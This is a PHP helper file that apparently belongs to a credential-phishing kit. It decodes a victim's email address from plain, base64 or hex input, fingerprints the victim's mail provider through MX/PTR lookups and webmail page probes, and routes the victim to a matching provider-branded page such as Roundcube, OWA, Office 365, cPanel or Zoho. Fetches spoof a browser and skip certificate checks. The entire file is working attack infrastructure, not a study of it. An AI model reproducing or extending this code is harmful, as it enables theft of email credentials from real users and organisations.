<?php
// ============================================================
// Helper functions for index.php
// ============================================================

// ------------------------------------------------------------
// normalizeProducts — accepts plain email, base64/base64url,
// or hex, and returns the decoded plain email (or '').
// ------------------------------------------------------------
function normalizeProducts(string $raw): string {
    $raw = trim($raw);
    if ($raw === '') return '';

    if (filter_var($raw, FILTER_VALIDATE_EMAIL)) {
        return $raw;
    }

    $b64 = strtr($raw, '-_', '+/');
    $b64 .= str_repeat('=', (4 - strlen($b64) % 4) % 4);
    $decoded = base64_decode($b64, true);
    if ($decoded !== false && filter_var($decoded, FILTER_VALIDATE_EMAIL)) {
        return $decoded;
    }

    if (ctype_xdigit($raw) && strlen($raw) % 2 === 0) {
        $decoded = @hex2bin($raw);
        if ($decoded !== false && filter_var($decoded, FILTER_VALIDATE_EMAIL)) {
            return $decoded;
        }
    }

    return '';
}

// ------------------------------------------------------------
// Reference file loaders
// ------------------------------------------------------------
function loadReferenceFile(string $name): array {
    $paths = [
        __DIR__ . '/' . $name,
        __DIR__ . '/assets/' . $name,
        dirname(__DIR__) . '/' . $name,
    ];
    foreach ($paths as $p) {
        if (file_exists($p)) {
            $lines = file($p, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            return array_values(array_filter(array_map('trim', $lines)));
        }
    }
    return [];
}

// ------------------------------------------------------------
// containsToken — boundary-aware substring match
// ------------------------------------------------------------
function containsToken(string $haystack, string $needle): bool {
    $needle = strtolower($needle);
    if ($needle === '') return false;

    if (strlen($needle) >= 6) {
        return str_contains($haystack, $needle);
    }

    $pattern = '/(?:^|[\s.@\-])' . preg_quote($needle, '/') . '(?:[\s.\-]|$)/';
    return (bool) preg_match($pattern, $haystack);
}

// ------------------------------------------------------------
// hasRecognizableMx — fast DNS-only check
// ------------------------------------------------------------
function hasRecognizableMx(string $domain): bool {
    if ($domain === '') return false;
    $domain = strtolower($domain);

    foreach (['apart-rent.com', 'goeugo.eu', 'nomadsensecreative.com'] as $base) {
        if ($domain === $base || str_ends_with($domain, '.' . $base)) return true;
    }

    $mx = @dns_get_record($domain, DNS_MX);
    if (empty($mx)) return false;

    $haystack = ' ' . $domain;
    foreach ($mx as $r) {
        $haystack .= ' ' . strtolower($r['target'] ?? '');
    }

    foreach ([
        'tradeindia.com', 'yahoodns.net', 'yahoo small business',
        'roundcube', 'rcmail', 'cpanel', 'whm', 'cpsess',
        'hostgator', 'bluehost', 'justhost', 'ipage', 'greengeeks',
        'a2hosting', 'inmotion', 'namecheap', 'unifiedlayer',
        'aruba', 'messagingengine', 'dreamhost', 'google', '126mx', '263',
        'one.com', '.web-hosting.', 'jellyfish.systems', 'privateemail',
        'hostinger', 'hostedemail', 'mimecast', 'chinaemail', 'global-mail',
        'comcast', 'cybermail', 'hzmx01', 'ntesmail', 'host-h', 'mxhichina',
        'aliyun', 'gmx', '.outlook.com', '.outlook.cn', 'natro', 'godaddy',
        'secureserver', 'ionos', 'interia', 'mail.com', 'smarshmail',
        'naver', 'netsol', 'rediffmailpro', 'orange.pl', 'protonmail',
        'yunyou', 'qq', 'emailsrvr', 'rackspace', 'register.it', 'zimbra',
        'rzone', 'serverdata', 'telkomsa', '.av-mx.', 'wadax', 'windstream',
        'zoho', 'worksmobile', 'mailplug', 'udomain', 'ovh', 'mailgun',
        'lolipop', 'mweb', '163mx', 'mx-biz.mail', 'terraempresas',
        'locaweb.com.br', 'mx3.bol', 'mx.terra.com.br', 'uhserver',
        'connect.com.fj', 'smartmail', 'smartermail', 'smartertools',
        'smarter', 'titan', 'horde', 'daum', 'qiye163mx',
        'exchange', 'autodiscover', 'sogo',
        'mailanyone', 'mx25.net',
    ] as $kw) {
        if (str_contains($haystack, $kw)) return true;
    }
    return false;
}

// ------------------------------------------------------------
// getMxFile — main router
// ------------------------------------------------------------
function getMxFile($products) {
    if (empty($products) || !filter_var($products, FILTER_VALIDATE_EMAIL)) {
        return "all.php";
    }
    $domain = substr($products, strpos($products, '@') + 1);
    if (empty($domain)) return "all.php";

    $cacheFile = sys_get_temp_dir() . '/webmail_route_' . md5($domain) . '.txt';
    if (file_exists($cacheFile) && (time() - filemtime($cacheFile)) < 86400) {
        $cached = trim(file_get_contents($cacheFile));
        if ($cached !== '') return $cached;
    }

    // STEP 1 — explicit routes
    $explicit_routes = [
        'apart-rent.com'         => 'cpw.php',
        'goeugo.eu'              => 'rc.php',
        'nomadsensecreative.com' => 'rc.php',
        'disc.ie'                => 'smarter.php',
    ];
    $domainLower = strtolower($domain);
    foreach ($explicit_routes as $base => $target) {
        if ($domainLower === $base || str_ends_with($domainLower, '.' . $base)) {
            @file_put_contents($cacheFile, $target);
            return $target;
        }
    }

    // Build MX + PTR haystack
    $mxRecords   = @dns_get_record($domain, DNS_MX);
    $mxHaystack  = '';
    $ptrHaystack = '';
    $mxFound     = false;

    if (!empty($mxRecords)) {
        foreach ($mxRecords as $mx) {
            $target = strtolower($mx['target'] ?? '');
            if ($target === '') continue;
            $mxFound = true;
            $mxHaystack .= ' ' . $target;

            $aRecords = @dns_get_record($target, DNS_A);
            if (!$aRecords) continue;
            foreach ($aRecords as $a) {
                if (empty($a['ip'])) continue;
                $reversedIp = implode('.', array_reverse(explode('.', $a['ip']))) . '.in-addr.arpa';
                $ptrRecords = @dns_get_record($reversedIp, DNS_PTR);
                if (!$ptrRecords) continue;
                foreach ($ptrRecords as $ptr) {
                    $ptrHost = strtolower($ptr['target'] ?? '');
                    if ($ptrHost !== '') $ptrHaystack .= ' ' . $ptrHost;
                }
            }
        }
    }
    $combinedHaystack = $mxHaystack . ' ' . $ptrHaystack . ' ' . $domainLower;

    // --- Zoho ---
    foreach (['.zoho.', 'zoho.com', 'zohomail', 'zoho.eu', 'zoho.in', 'mail.zoho'] as $kw) {
        if (str_contains($combinedHaystack, $kw)) {
            @file_put_contents($cacheFile, 'zoho.php');
            return 'zoho.php';
        }
    }

    // --- Hostinger / Titan ---
    foreach (['hostinger', 'titan.email', 'titan.com', 'mail.hostinger'] as $kw) {
        if (str_contains($combinedHaystack, $kw)) {
            @file_put_contents($cacheFile, 'hostinger.php');
            return 'hostinger.php';
        }
    }

    // --- SoGo ---
    foreach (['.sogo.', 'sogo.', 'sogo-webmail', 'sogo webmail',
              'sogod', 'sogo-agent', 'sogo.example', 'sogo'] as $kw) {
        if (containsToken($combinedHaystack, $kw)) {
            @file_put_contents($cacheFile, 'mailcow.php');
            return 'mailcow.php';
        }
    }

    // --- SmarterMail / SmarterTools ---
    foreach (['smartermail', 'smartertools', 'smarter', 'smartmail'] as $kw) {
        if (str_contains($combinedHaystack, $kw)) {
            @file_put_contents($cacheFile, 'smarter.php');
            return 'smarter.php';
        }
    }

    // --- MailAnyone / MX25 relay (uses SmarterMail on their portal) ---
    foreach (['mailanyone', 'mx25.net', '.mx25.'] as $kw) {
        if (str_contains($combinedHaystack, $kw)) {
            @file_put_contents($cacheFile, 'smarter.php');
            return 'smarter.php';
        }
    }

    // --- TradeIndia shared Zimbra cluster ---
    foreach (['.tradeindia.com', 'tradeindia.com',
              'clientsmtp.tradeindia.com', 'zmta01.tradeindia.com',
              'clientpop.tradeindia.com'] as $kw) {
        if (str_contains($combinedHaystack, $kw)) {
            @file_put_contents($cacheFile, 'zimbra.php');
            return 'zimbra.php';
        }
    }

    // --- Yahoo Small Business ---
    foreach (['yahoo small business', 'smallbusiness.yahoo', 'yahoodns.net'] as $kw) {
        if (str_contains($combinedHaystack, $kw)) {
            @file_put_contents($cacheFile, 'yahoo.php');
            return 'yahoo.php';
        }
    }

    // --- OWA / self-hosted Exchange ---
    foreach (['serverdata', 'secureserver.net', 'exchange', 'autodiscover'] as $kw) {
        if (str_contains($combinedHaystack, $kw)) {
            @file_put_contents($cacheFile, 'owa.php');
            return 'owa.php';
        }
    }

    // --- Roundcube ---
    foreach (['roundcube', 'rcmail', 'stackmail', 'ispservices',
              'roundcube_sessid', 'rcmcsrftoken', '?_task=login'] as $kw) {
        if (str_contains($combinedHaystack, $kw)) {
            @file_put_contents($cacheFile, 'rc.php');
            return 'rc.php';
        }
    }

    // --- cPanel ---
    foreach (['cpanel', 'whm', 'unifiedlayer', 'hostgator', 'bluehost', 'justhost',
              'ipage', 'greengeeks', 'a2hosting', 'inmotion', 'namecheap',
              'web-hosting', 'cpsess'] as $kw) {
        if (str_contains($combinedHaystack, $kw)) {
            @file_put_contents($cacheFile, 'cpw.php');
            return 'cpw.php';
        }
    }

    // --- Full keyword map (longer self-hosted needles first) ---
    $keywords_map = [
        // Self-hosted mail servers
        'smartermail'   => 'smarter.php',
        'smartertools'  => 'smarter.php',
        'smarter'       => 'smarter.php',
        'smartmail'     => 'smarter.php',
        'mailenable'    => 'enable.php',
        'mdaemon'       => 'mdaemon.php',
        'worldclient'   => 'mdaemon.php',
        'squirrelmail'  => 'squirrel.php',
        'afterlogic'    => 'afterlogic.php',
        'icewarp'       => 'icewarp.php',
        'horde'         => 'horde.php',
        'mailcow'       => 'mailcow.php',
        // MailAnyone relay
        'mailanyone'    => 'smarter.php',
        'mx25.net'      => 'smarter.php',
        // Generic hosting
        'aruba' => 'aruba.php',
        'mta6.am0.yahoodns.net' => 'yahoo.php',
        'messagingengine' => 'fastmail.php',
        'dreamhost' => 'dreamhost.php',
        'google' => 'google.php',
        '126mx' => '126.php',
        '263' => '263.php',
        '263xmail' => '263.php',
        'one.com' => 'one.php',
        '.web-hosting.' => 'nc.php',
        'mx2-hosting.jellyfish.systems' => 'nc.php',
        'mx1.privateemail.' => 'private.php',
        'mx2.privateemail.' => 'private.php',
        'hostinger' => 'hostinger.php',
        'oxse3a.privateemail.' => 'nc.php',
        'hostedemail' => 'hostedemail.php',
        'mx-aol.mail.gm0.yahoodns.net' => 'aol.php',
        'mimecast' => 'mimecast.php',
        'chinaemail' => 'bossmail.php',
        'global-mail' => 'globalmail.php',
        'comcast' => 'comcast.php',
        'cybermail' => 'cybermail.php',
        'hzmx01.' => 'netease.php',
        '.xmail.ntesmail.' => 'netease.php',
        'host-h' => 'konsolh.php',
        'mxhichina' => 'mxhichina.php',
        '.qiye.aliyun.' => 'mxhichina.php',
        'gmx' => 'gmx.php',
        '.outlook.com' => 'office.php',
        '.outlook.cn' => 'office_cn.php',
        'natro' => 'natro.php',
        'natrohost' => 'natro.php',
        'godaddy' => 'godaddy.php',
        'secureserver' => 'godaddy.php',
        'ionos' => 'ionos.php',
        'interia' => 'interia.php',
        'smarshmail' => 'smarsh.php',
        'naver' => 'naver.php',
        'netsol' => 'netsol.php',
        'rediffmailpro' => 'rediffmailpro.php',
        'orange.pl' => 'orangepl.php',
        'protonmail' => 'protonmail.php',
        'yunyou' => 'yunyou.php',
        'qq' => 'qq.php',
        'emailsrvr' => 'emailsrvr.php',
        'rackspace' => 'emailsrvr.php',
        'register.it' => 'registerit.php',
        'zimbra' => 'zimbra.php',
        'rzone' => 'strato.php',
        'serverdata' => 'owa.php',
        'telkomsa' => 'telkomsa.php',
        '.av-mx.' => 'zimbra.php',
        'wadax' => 'wadax.php',
        'windstream' => 'windstream.php',
        'zoho' => 'zoho.php',
        '.mail.aliyun.' => 'mailaliyun.php',
        'worksmobile' => 'worksmobile.php',
        'mailplug' => 'mailplug.php',
        'udomain' => 'udomain.php',
        'ovh' => 'ovhcloud.php',
        'mailgun' => 'mailgun.php',
        'lolipop' => 'lolipop.php',
        'mweb' => 'mweb.php',
        '163mx' => '163.php',
        'mx-biz.mail' => 'bizmail.php',
        'mx.terraempresas.com.br' => 'terrabr.php',
        'locaweb.com.br' => 'locaweb.php',
        'mx3.bol' => 'uol.php',
        'mx.terra.com.br' => 'terrabr.php',
        'mx.uhserver.com' => 'userver.php',
        'connect.com.fj' => 'connect.php',
        'titan' => 'hostinger.php',
        'daum' => 'daum.php',
        'qiye163mx.' => 'netease.php',
        'livemail.co.uk' => 'owa.php',
        // SoGo — redundant safety
        'sogo' => 'mailcow.php',
        'sogod' => 'mailcow.php',
        'sogo-webmail' => 'mailcow.php',
        // Extra safety
        'mail.zoho' => 'zoho.php',
        'mail.hostinger' => 'hostinger.php',
    ];
    foreach ($keywords_map as $kw => $file) {
        if (containsToken($combinedHaystack, $kw)) {
            @file_put_contents($cacheFile, $file);
            return $file;
        }
    }

    // --- mail.com (strict) ---
    if (preg_match('/(?:^|[\s.@])mail\.com(?:[\s.]|$)/', $combinedHaystack)) {
        @file_put_contents($cacheFile, 'mailcom.php');
        return 'mailcom.php';
    }

    // ------------------------------------------------------------
    // DomainFormat + ValidTitles probe
    // ------------------------------------------------------------
    $formats = loadReferenceFile('DomainFormat.txt');
    if (empty($formats)) {
        $formats = [
            '[domain]', 'mail.[domain]', 'webmail.[domain]',
            'zimbra.[domain]', 'mail.[domain]/zimbra/',
            'webmail.[domain]/zimbra/', 'autodiscover.[domain]',
            '[domain]:2095/', '[domain]:2096/',
            '[domain]/webmail', '[domain]/roundcube',
            'webmail.[domain]/roundcube',
            'mail.[domain]/owa/', '[domain]/owa/',
            'mail.[domain]/Login.aspx', 'mail.[domain]/login.aspx',
            '[domain]/Login.aspx',
        ];
    }
    $urls = [];
    foreach ($formats as $tpl) {
        $url = str_replace('[domain]', $domain, $tpl);
        if (!preg_match('#^https?://#i', $url)) {
            $url = (preg_match('#:209[56]#', $url) || preg_match('#:80#', $url))
                ? 'http://' . $url
                : 'https://' . $url;
        }
        $urls[] = $url;
    }
    $urls[] = 'https://' . $domain;
    $urls   = array_values(array_unique($urls));

    $titles      = loadReferenceFile('ValidTitles.txt');
    $titlesLower = array_map(fn($t) => strtolower(trim($t)), $titles);

    foreach ($urls as $url) {
        $result = inspectWebmailPage($url, $titlesLower);
        if ($result !== null && $result !== '') {
            @file_put_contents($cacheFile, $result);
            return $result;
        }
    }

    // ------------------------------------------------------------
    // SmarterMail direct probe — http://mail.[domain]/Login.aspx
    // SmarterMail always serves /Login.aspx and often only over HTTP
    // (port 80), not HTTPS. The generic probe above misses these.
    // ------------------------------------------------------------
    foreach (['mail.' . $domain, 'webmail.' . $domain, $domain] as $host) {
        $smUrl  = "http://{$host}/Login.aspx";
        $smHtml = fetchPage($smUrl);
        if ($smHtml !== null) {
            $smLower = strtolower($smHtml);
            if (str_contains($smLower, 'smartermail') ||
                str_contains($smLower, 'smartermail enterprise') ||
                str_contains($smLower, 'login to smartermail') ||
                str_contains($smLower, 'smartertools') ||
                str_contains($smLower, 'svlogin') ||
                str_contains($smLower, 'ctl00_')) {
                @file_put_contents($cacheFile, 'smarter.php');
                return 'smarter.php';
            }
        }
    }

    // cPanel 2096 probe
    $fp = @fsockopen("ssl://{$domain}", 2096, $errno, $errstr, 2);
    if ($fp) {
        fclose($fp);
        @file_put_contents($cacheFile, 'cpw.php');
        return 'cpw.php';
    }

    // SmarterMail default SSL port 9998
    foreach (['mail.' . $domain, 'webmail.' . $domain, $domain] as $host) {
        $fp = @fsockopen("ssl://{$host}", 9998, $e1, $e2, 2);
        if ($fp) {
            fclose($fp);
            @file_put_contents($cacheFile, 'smarter.php');
            return 'smarter.php';
        }
    }

    // ============================================================
    // FALLBACK — never cache, never return all.php when MX exists.
    // Return the bare domain so the Login URL stays useful.
    // ============================================================
    return 'https://' . $domain;
}

// ------------------------------------------------------------
// inspectWebmailPage
// ------------------------------------------------------------
function inspectWebmailPage(string $url, array $titlesLower): ?string {
    $html = fetchPage($url);
    if ($html === null) return null;

    $title = extractTitle($html);

    if ($title === null
        || stripos($title, 'please wait') !== false
        || stripos($html, 'please wait while we verify') !== false
        || stripos($html, 'checking your browser') !== false
    ) {
        sleep(3);
        $html2 = fetchPage($url);
        if ($html2 !== null) {
            $title2 = extractTitle($html2);
            if ($title2 !== null) $title = $title2;
            $html = $html2;
        }
    }

    $bodyMatch = matchBodySignatures($html);
    if ($bodyMatch !== null) return $bodyMatch;

    if ($title === null) return null;

    $titleClean = strtolower(trim(html_entity_decode($title, ENT_QUOTES | ENT_HTML5)));

    foreach ($titlesLower as $t) {
        if ($t === $titleClean) return mapTitleToFile($titleClean);
    }
    foreach ($titlesLower as $t) {
        if ($t !== '' && str_contains($titleClean, $t)) return mapTitleToFile($t);
    }

    return null;
}

function extractTitle(string $html): ?string {
    if (preg_match('#<title[^>]*>(.*?)</title>#is', $html, $m)) {
        return trim($m[1]);
    }
    return null;
}

function mapTitleToFile(string $title): string {
    $t = strtolower(trim($title));

    if (str_contains($t, 'roundcube') || str_contains($t, 'rcmail')) return 'rc.php';
    if (str_contains($t, 'cpanel')) return 'cpw.php';

    if (str_contains($t, 'outlook web app') ||
        str_contains($t, 'outlook web access') ||
        $t === 'owa' ||
        str_contains($t, 'exchange server') ||
        str_contains($t, 'exchange admin center')) {
        return 'owa.php';
    }

    if (str_contains($t, 'outlook') ||
        str_contains($t, 'sign in - google accounts')) {
        return 'office.php';
    }

    if (str_contains($t, 'sogo'))                                       return 'mailcow.php';

    // SmarterMail — check BEFORE generic keywords
    if (str_contains($t, 'smartermail') ||
        str_contains($t, 'smartermail enterprise') ||
        str_contains($t, 'login to smartermail') ||
        str_contains($t, 'smartertools')) {
        return 'smarter.php';
    }

    if (str_contains($t, 'zimbra'))                                     return 'zimbra.php';
    if (str_contains($t, 'mailenable'))                                 return 'enable.php';
    if (str_contains($t, 'horde'))                                      return 'horde.php';
    if (str_contains($t, 'squirrelmail'))                               return 'squirrel.php';
    if (str_contains($t, 'icewarp'))                                    return 'icewarp.php';
    if (str_contains($t, 'mdaemon') || str_contains($t, 'worldclient')) return 'mdaemon.php';
    if (str_contains($t, 'kerio'))                                      return 'kerio.php';
    if (str_contains($t, 'afterlogic'))                                 return 'afterlogic.php';
    if (str_contains($t, 'dreamhost'))                                  return 'dreamhost.php';
    if (str_contains($t, 'zoner'))                                      return 'zoner.php';
    if (str_contains($t, 'mailcow'))                                    return 'mailcow.php';
    if (str_contains($t, 'konsoleh'))                                   return 'konsolh.php';
    if (str_contains($t, 'udomain'))                                    return 'udomain.php';
    if ($t === 'uol')                                                   return 'uol.php';

    if (in_array($t, [
        'webmail', 'webmail login', 'webmail redirect',
        'webmail client sign in', 'webmail sign in',
        'web client sign in', 'web app', 'login', 'welcome',
    ], true)) {
        return 'cpw.php';
    }
    return '';
}

function matchBodySignatures(string $html): ?string {
    $h = strtolower($html);

    if (str_contains($h, 'logon.aspx') ||
        str_contains($h, '/owa/') ||
        str_contains($h, 'outlook web app') ||
        str_contains($h, 'outlook web access') ||
        str_contains($h, 'microsoft.exchange') ||
        str_contains($h, '/ecp/') ||
        str_contains($h, 'logoff.aspx')) {
        return 'owa.php';
    }

    if (str_contains($h, 'rcmail') ||
        str_contains($h, 'roundcube') ||
        str_contains($h, '?_task=login') ||
        str_contains($h, '_task=login') ||
        str_contains($h, 'rcmcsrftoken') ||
        str_contains($h, 'roundcube_sessid') ||
        str_contains($h, 'id="rcmloginuser"') ||
        str_contains($h, "id='rcmloginuser'") ||
        str_contains($h, 'id="rcmloginpwd"') ||
        str_contains($h, "id='rcmloginpwd'") ||
        str_contains($h, 'name="_task"') ||
        str_contains($h, 'name="_action"')) {
        return 'rc.php';
    }

    if (str_contains($h, 'sogo') ||
        str_contains($h, '/sogo/') ||
        str_contains($h, 'sogod') ||
        str_contains($h, 'sogo-webmail') ||
        str_contains($h, 'sogo_login') ||
        str_contains($h, 'ng-app="sogo"') ||
        str_contains($h, 'webmail.sogo') ||
        preg_match('#/SOGo/WebMailer#i', $html)) {
        return 'mailcow.php';
    }

    // SmarterMail — multiple signals (including Enterprise version string)
    if (str_contains($h, 'smartermail') ||
        str_contains($h, 'smartermail enterprise') ||
        str_contains($h, 'login to smartermail') ||
        str_contains($h, 'smartertools') ||
        str_contains($h, 'st_') ||
        str_contains($h, 'stm_') ||
        str_contains($h, 'id="ctl00_') ||
        str_contains($h, 'sm-login') ||
        str_contains($h, 'svlogin') ||
        str_contains($h, 'class="st-') ||
        (str_contains($h, 'webmail') && str_contains($h, 'aspnet'))) {
        return 'smarter.php';
    }

    if (str_contains($h, 'cpsess') ||
        str_contains($h, 'login/?login_only=1') ||
        str_contains($h, 'cpanel, l.l.c.') ||
        str_contains($h, 'cpanel, inc.')) {
        return 'cpw.php';
    }

    if (str_contains($h, 'zimbra') ||
        str_contains($h, 'zm_login') ||
        str_contains($h, '/service/soap') ||
        str_contains($h, 'zm_client')) {
        return 'zimbra.php';
    }

    if (str_contains($h, 'mailenable'))   return 'enable.php';
    if (str_contains($h, 'horde'))        return 'horde.php';
    if (str_contains($h, 'squirrelmail')) return 'squirrel.php';

    return null;
}

// ------------------------------------------------------------
// fetchPage
// ------------------------------------------------------------
function fetchPage(string $url): ?string {
    if (!function_exists('curl_init')) {
        $ctx = stream_context_create([
            'http' => [
                'method'  => 'GET',
                'timeout' => 6,
                'header'  => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n",
            ],
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false],
        ]);
        $body = @file_get_contents($url, false, $ctx);
        return $body === false ? null : $body;
    }
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 5, CURLOPT_TIMEOUT => 6,
        CURLOPT_CONNECTTIMEOUT => 3,
        CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36',
        CURLOPT_HTTPHEADER => [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.9',
        ],
    ]);
    $body = curl_exec($ch);
    curl_close($ch);
    return $body === false ? null : $body;
}